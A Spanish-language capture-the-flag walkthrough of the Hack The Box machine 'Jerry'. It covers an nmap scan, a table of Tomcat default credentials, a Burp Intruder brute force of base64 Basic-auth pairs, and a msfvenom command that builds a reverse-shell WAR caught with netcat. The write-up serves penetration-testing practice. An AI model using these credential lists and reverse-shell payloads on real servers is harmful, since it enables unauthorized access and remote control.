# 5 - Jerry \(win\_easy\)

## **Scanning**

```text
nmap -T4 -p- -A -sS 10.10.10.4
```

![](../../.gitbook/assets/imagen%20%28556%29.png)

Tenemos un **apache tomacat default page**.

![](../../.gitbook/assets/imagen%20%28552%29.png)



### Apache Tomcat Default Credentials

| Username | Password |
| :--- | :--- |
| admin | password |
| admin |  |
| admin | Password1 |
| admin | password1 |
| admin | admin |
| admin | tomcat |
| both | tomcat |
| manager | manager |
| role1 | role1 |
| role1 | tomcat |
| role | changethis |
| root | Password1 |
| root | changethis |
| root | password |
| root | password1 |
| root | r00t |
| root | root |
| root | toor |
| tomcat | tomcat |
| tomcat | s3cret |
| tomcat | password1 |
| tomcat | password |
| tomcat |  |
| tomcat | admin |
| tomcat | changethis |

### Usando burpsuit

Lo arracamos con todo default

Vamos a proxy -&gt; opciones vemos la ip

Lo ponemos como proxy de firefox

![](../../.gitbook/assets/imagen%20%28549%29.png)

#### Enviando una default credential

Al entrar al login probamos tomcat tomcat pero antes de enviarla probamos ver donde estan esos parametros. 

![](../../.gitbook/assets/imagen%20%28559%29.png)

Bien el problema aqui es que aparece como Basic: y algo encriptado \(en la ultima linea\), para esto lo enviamos al decoder. En el decoder lo podemos cambiar a base64 y verlos en plain text

![Resultado](../../.gitbook/assets/imagen%20%28548%29.png)

No hubo suerte con el anterior.

Hacemos **gedit** con las contraseñas y usuarios por defecto, reemplazamos \(cntl h\) el espacio en el medio por un **:** ya que es el formato por defecto que vimos.

![](../../.gitbook/assets/imagen%20%28557%29.png)

Hacemos un bash script para pasar eso todo a base64

```text
for cred in $(cat tomcat.txt); do echo -n $cred | base64; done
```

Back al burpsuit, desde ahi ponemos el modo intruder en sniper. Seleccionamos el archivo en base64 y desde payloads le cargamos los hashes.

![](../../.gitbook/assets/imagen%20%28562%29.png)

Pasandole el payload llegamos al correcto, decodificandola era **tomcat:s3cret**

![](../../.gitbook/assets/imagen%20%28561%29.png)

### **Inside tomcat**

![](../../.gitbook/assets/imagen%20%28554%29.png)

Vemos que maneja los archivos WAR, podemos subir alguno, probemos uno malicioso de google.

Con msfvenom

```text
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
```

Usaremos netcat para escuchar la entrada del reverse shell

![](../../.gitbook/assets/imagen%20%28550%29.png)

![](../../.gitbook/assets/imagen%20%28560%29.png)



